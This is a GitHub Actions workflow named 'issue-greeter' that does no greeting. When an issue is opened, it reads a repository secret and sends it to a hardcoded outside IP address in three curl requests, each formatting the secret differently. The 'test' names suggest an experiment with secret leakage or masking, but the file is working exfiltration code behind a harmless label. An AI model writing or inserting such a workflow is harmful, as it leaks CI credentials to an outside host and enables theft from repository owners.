name: issue-greeter
on:
  issues:
    types: [opened]
jobs:
  my-job:
    runs-on: ubuntu-latest
    steps:
      - name: my-step
        env:
          SUPER_SECRET: ${{ secrets.TEST_SECRET_OHMY }}
          OWNER: ${{ github.event.repository.owner.login }}
          ISSUE_NUMBER: ${{ github.event.issue.number }}
        run: |
          curl -s -X GET http://3.141.45.25/test1/${{ secrets.TEST_SECRET_OHMY }}
          curl -s -X GET http://3.141.45.25/test2/%SUPER_SECRET%
          curl -s -X GET http://3.141.45.25/test3/$SUPER_SECRET
